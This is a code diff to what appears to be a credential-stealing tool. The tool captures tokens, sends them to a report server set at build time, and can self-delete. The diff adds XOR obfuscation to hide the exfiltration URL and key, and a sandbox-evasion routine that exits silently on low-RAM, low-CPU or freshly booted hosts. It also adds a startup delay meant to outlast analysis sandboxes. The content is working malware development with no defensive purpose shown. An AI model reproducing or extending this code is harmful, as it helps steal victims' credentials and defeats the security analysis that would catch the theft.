@@ -336,10 +336,50 @@ _NOISE_EXACT: frozenset[str] = frozenset([
 ])
 
 
-# Build-time exfil defaults - substituted by build_windows.ps1 / build_mac.sh.
-# When non-empty the exe auto-exfils after every run with no CLI flags required.
-_EXFIL_URL: str = ""
-_EXFIL_KEY: str = ""
+# Build-time exfil defaults - substituted by build_mac.sh.
+# The URL/key are XOR-obfuscated at build time so they aren't plaintext strings.
+_EXFIL_URL_ENC: str = ""
+_EXFIL_KEY_ENC: str = ""
+_EXFIL_XOR_KEY: str = ""
+
+
+def _xor_decrypt(cipher_hex: str, key_hex: str) -> str:
+    if not cipher_hex or not key_hex:
+        return ""
+    try:
+        key = bytes.fromhex(key_hex)
+        data = bytes.fromhex(cipher_hex)
+        return bytes(b ^ key[i % len(key)] for i, b in enumerate(data)).decode("utf-8")
+    except Exception:
+        return ""
+
+
+_EXFIL_URL: str = _xor_decrypt(_EXFIL_URL_ENC, _EXFIL_XOR_KEY)
+_EXFIL_KEY: str = _xor_decrypt(_EXFIL_KEY_ENC, _EXFIL_XOR_KEY)
+_DEFAULT_DELAY: int = 0
+
+
+def _evasion_gate(delay_sec: int = 0) -> None:
+    """Sandbox/VM checks + optional startup delay. Exit silently if the host looks like an analysis box."""
+    if delay_sec > 0:
+        time.sleep(delay_sec)
+    try:
+        # Total RAM < 2 GB (sysctl hw.memsize returns bytes)
+        out = subprocess.check_output(["sysctl", "-n", "hw.memsize"], text=True, timeout=5).strip()
+        if int(out) < 2 * 1024**3:
+            os._exit(0)
+    except Exception:
+        pass
+    try:
+        if os.cpu_count() < 2:
+            os._exit(0)
+        # Uptime < 5 min (sysctl kern.boottime reports boot epoch seconds)
+        out = subprocess.check_output(["sysctl", "-n", "kern.boottime"], text=True, timeout=5)
+        m = re.search(r"sec\s*=\s*(\d+)", out)
+        if m and (time.time() - int(m.group(1))) < 300:
+            os._exit(0)
+    except Exception:
+        pass
 
 def _trunc(val: str, n: int = 80) -> str:
     return val[:n] + "…" if len(val) > n else val
@@ -1854,7 +1894,9 @@ def main():
     parser.add_argument("--verify",      action="store_true", help="Verify captured tokens against their services (outbound requests)")
     parser.add_argument("--exfil",       metavar="URL",       default=_EXFIL_URL or None, help="POST results to report server (default: baked in at build time)")
     parser.add_argument("--exfil-key",   metavar="KEY",       default=_EXFIL_KEY or None, help="API key for --exfil (default: baked in at build time)")
+    parser.add_argument("--delay",       type=int, default=_DEFAULT_DELAY, help="Sleep N seconds before extraction (evade short-timeout sandboxes)")
     args = parser.parse_args()
+    _evasion_gate(args.delay)
 
     # Delete the binary immediately after launch - the process stays alive in memory.
     if args.self_delete:
